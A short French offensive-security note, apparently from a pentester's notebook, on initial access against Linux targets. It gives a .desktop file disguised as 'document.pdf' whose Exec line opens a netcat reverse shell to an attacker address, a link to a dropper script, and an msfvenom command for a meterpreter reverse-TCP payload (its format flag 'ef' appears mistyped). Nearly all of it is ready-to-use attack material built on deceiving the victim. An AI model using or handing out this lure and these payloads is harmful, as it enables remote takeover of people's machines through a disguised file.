Fait partie la phase de [[Initial Access/README|l'access initial]]

Le but est d'envoyer un fichier `.desktop` a notre cible et obtenir un reverse shell.

```sh
[Desktop Entry]
Type=Application
Name=document.pdf
Exec=/bin/nc -e /bin/sh 192.168.45.128 4444
Icon=/home/kali/Pictures/test.png
```

Download `LinDrop.py`at https://www.obscurechannel.com/x42/code.html

```sh
msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp LPORT=9001 LHOST=192.168.45.128 -f ef > payload
```